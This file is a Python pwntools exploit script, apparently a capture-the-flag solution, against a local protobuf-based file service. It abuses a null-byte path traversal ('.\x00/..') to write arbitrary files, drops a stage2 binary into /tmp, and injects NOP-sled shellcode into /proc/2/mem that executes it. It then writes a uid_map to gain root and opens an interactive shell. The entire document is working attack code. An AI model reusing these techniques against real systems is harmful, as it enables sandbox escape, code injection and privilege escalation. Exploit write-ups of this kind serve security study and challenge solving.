#!/usr/bin/env python
#
#Copyright 2020 Google LLC
#
#Licensed under the Apache License, Version 2.0 (the "License");
#you may not use this file except in compliance with the License.
#You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS,
#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#    See the License for the specific language governing permissions and
#    limitations under the License.

# -*- coding: utf-8 -*-

from pwn import *
import subprocess
import nsfs_pb2 as nsfs

context.arch = 'amd64'

subprocess.check_call(['make', 'stage2'])

r = remote('127.0.0.1', 1337)

process_cnt = 2

def chunks(lst, n):
  for i in range(0, len(lst), n):
    yield lst[i:i + n]

def write_file(path, data, offset=0):
  global process_cnt
  for part in chunks(data, 4096):
    op = nsfs.Operation()
    op.action = nsfs.WRITE
    op.path = ".\x00/.." + path
    op.data = part
    if offset != 0:
      op.offset = offset
    msg = op.SerializeToString()
    r.send(p32(len(msg)) + msg)
    offset += 4096
    process_cnt += 1
    #r.recvuntil('write success\n')

write_file('/tmp/stage2', read('stage2'))

sc = shellcraft.nop()*0x100 + shellcraft.execve('/tmp/stage2')
write_file('/proc/2/mem', asm(sc), ELF('./init').symbols['main'])

r.recvuntil('waiting for uid 0')
print('writing uid_map')
write_file('/proc/{}/uid_map'.format(process_cnt+1), "0 1338 1\n1338 0 1")

r.interactive()
